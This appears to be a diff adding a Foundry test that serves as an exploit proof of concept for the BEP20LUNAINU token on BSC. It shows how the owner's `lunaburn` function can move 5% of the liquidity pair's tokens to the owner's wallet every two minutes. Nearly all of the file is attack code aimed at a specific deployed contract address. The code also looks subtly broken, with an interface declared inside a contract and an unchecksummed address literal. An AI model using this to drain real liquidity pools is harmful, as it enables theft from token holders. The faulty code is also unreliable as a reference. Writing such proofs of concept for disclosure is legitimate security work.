@@ -1,0 +1,69 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.15;
+
+import "forge-std/Test.sol";
+
+/// @title Exploit for BEP20LUNAINU – lunaburn drains liquidity
+/// @notice The `lunaburn` function allows the owner to transfer up to 5% of the LP pool tokens
+///         to their wallet every 2 minutes, effectively stealing liquidity from the pair.
+contract ExploitTest is Test {
+    // Target token contract address on BSC
+    address constant TOKEN = 0xf05a8a840f09ac83b79875b4275cec1e60c2abdf;
+
+    // Minimal interface with the functions we need
+    interface IBEP20LUNAINU {
+        function getOwner() external view returns (address);
+        function balanceOf(address account) external view returns (uint256);
+        function lastSync() external view returns (uint256);
+        function pair() external view returns (address);
+        function lunaburn(uint256 percent_base1000) external;
+    }
+
+    IBEP20LUNAINU public token;
+    address public owner;
+    address public pair;
+
+    function setUp() public {
+        token = IBEP20LUNAINU(TOKEN);
+        owner = token.getOwner();
+        pair = token.pair();
+        vm.label(owner, "Owner");
+        vm.label(pair, "Pair");
+        vm.label(TOKEN, "BEP20LUNAINU");
+    }
+
+    function testLunaburnDrainsLiquidity() public {
+        // Record balances before exploit
+        uint256 pairBalanceBefore = token.balanceOf(pair);
+        uint256 ownerBalanceBefore = token.balanceOf(owner);
+
+        // Ensure the pair has enough tokens to burn (liquidity exists)
+        require(pairBalanceBefore > 0, "No liquidity in pair");
+
+        // The lunaburn function requires block.timestamp > lastSync + 2 minutes
+        uint256 lastSync = token.lastSync();
+        vm.warp(lastSync + 3 minutes);
+
+        // Owner calls lunaburn with 5% (percent_base1000 = 50)
+        uint256 percent = 50; // 50/1000 = 5%
+        vm.prank(owner);
+        token.lunaburn(percent);
+
+        // Expected amount transferred to owner
+        uint256 expectedTransfer = (pairBalanceBefore * percent) / 1000;
+        // Note: due to integer division, actual may be slightly less depending on rounding
+        // We allow a small delta (±1 wei) to avoid off-by-one issues
+        uint256 actualTransfer = token.balanceOf(owner) - ownerBalanceBefore;
+        uint256 pairBalanceAfter = token.balanceOf(pair);
+
+        // The owner should have received `expectedTransfer` tokens
+        assertApproxEqAbs(actualTransfer, expectedTransfer, 1, "Owner received wrong amount");
+        // The pair balance should have decreased by the same amount
+        assertEq(pairBalanceAfter, pairBalanceBefore - actualTransfer, "Pair balance not reduced correctly");
+
+        // Additionally, verify that the lastSync storage was updated
+        assertGt(token.lastSync(), lastSync, "lastSync should have been updated");
+    }
+}
+```
